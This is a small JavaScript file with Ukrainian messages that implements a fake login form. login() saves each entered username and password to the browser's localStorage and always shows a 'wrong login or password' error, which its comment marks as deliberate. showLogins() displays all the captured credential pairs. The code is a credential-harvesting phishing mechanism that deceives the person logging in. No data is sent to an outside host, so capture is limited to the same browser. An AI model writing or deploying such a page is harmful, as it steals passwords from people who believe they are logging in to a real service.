function login() {
    const user = username.value.trim();
    const pass = password.value.trim();

    if (!user || !pass) {
        alert("Введи логін і пароль");
        return;
    }

    // отримуємо попередні логіни
    let logins = JSON.parse(localStorage.getItem("logins")) || [];

    // зберігаємо новий
    logins.push({ username: user, password: pass });

    localStorage.setItem("logins", JSON.stringify(logins));

    // завжди помилка
    alert("Невірний логін або пароль");
}

function showLogins() {
    let logins = JSON.parse(localStorage.getItem("logins")) || [];
    let text = "";

    logins.forEach(item => {
        text += item.username + ":" + item.password + "\n";
    });

    alert(text || "Немає даних");
}

function submitForm() {
    alert("Відправлено!");
}